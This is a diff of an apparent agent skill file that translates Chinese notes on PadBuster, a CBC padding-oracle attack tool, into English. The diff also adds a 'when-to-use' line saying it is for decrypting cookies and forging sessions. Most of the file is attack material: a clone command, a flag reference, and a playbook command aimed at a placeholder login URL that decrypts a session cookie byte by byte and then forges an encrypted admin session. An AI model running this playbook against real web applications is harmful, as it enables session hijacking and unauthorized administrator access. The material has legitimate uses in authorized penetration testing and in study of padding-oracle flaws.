@@ -2,39 +2,40 @@
 name: padbuster-padding-oracle
 description: "Web application exploitation scenario. Signals: web vulnerability, injection, encrypt arbitrary plaintext, cookie mode, no URL encoding."
 zh-signals: "PadBuster: Web应用漏洞利用场景。信号:web漏洞,注入,加密任意明文,cookie 模式,不 URL 编码。"
+when-to-use: "Use when a CBC-encrypted cookie or parameter shows padding oracle behavior and you need to decrypt it or forge arbitrary plaintext such as an admin session. Requires the target URL, ciphertext, block size, and an error fingerprint."
 ---
 
 # PadBuster
 
-- 攻击大类:C09 Web应用漏洞利用
-- 上游仓库:https://github.com/AonCyberLabs/PadBuster
-- 上游 License:Apache-2.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C09 Web Application Vulnerability Exploitation
+- Upstream Repository: https://github.com/AonCyberLabs/PadBuster
+- Upstream License: Apache-2.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/AonCyberLabs/PadBuster
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `perl padBuster.pl URL encData 16 -encoding 0` | Padding Oracle 攻击 |
-| `-plaintext 'user=admin'` | 加密任意明文 |
-| `-cookies` | cookie 模式 |
-| `-noencode` | 不 URL 编码 |
-| `-error 'invalid'` | 错误指纹 |
+| `perl padBuster.pl URL encData 16 -encoding 0` | Padding oracle attack |
+| `-plaintext 'user=admin'` | Encrypt arbitrary plaintext |
+| `-cookies` | Cookie mode |
+| `-noencode` | No URL encoding |
+| `-error 'invalid'` | Error fingerprint |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### CBC Padding Oracle 解密+伪造会话
+### CBC Padding Oracle Decryption and Session Forgery
 
 ```bash
 perl padBuster.pl https://target/login.jsp 'vlP6xG9f...' 8 -cookies auth=
-# 自动逐字节解密 → 再 -plaintext 伪造 admin 会话加密回写
+# Automatically decrypts byte by byte, then use -plaintext to forge an admin session and write it back encrypted
 ```
 
-## 注意事项
+## Notes
 
-经典 CBC padding oracle 工具;块大小 8/16 自适应,支持自动错误指纹学习。
+A classic CBC padding oracle tool; block size 8/16 is auto-detected and automatic error fingerprint learning is supported.
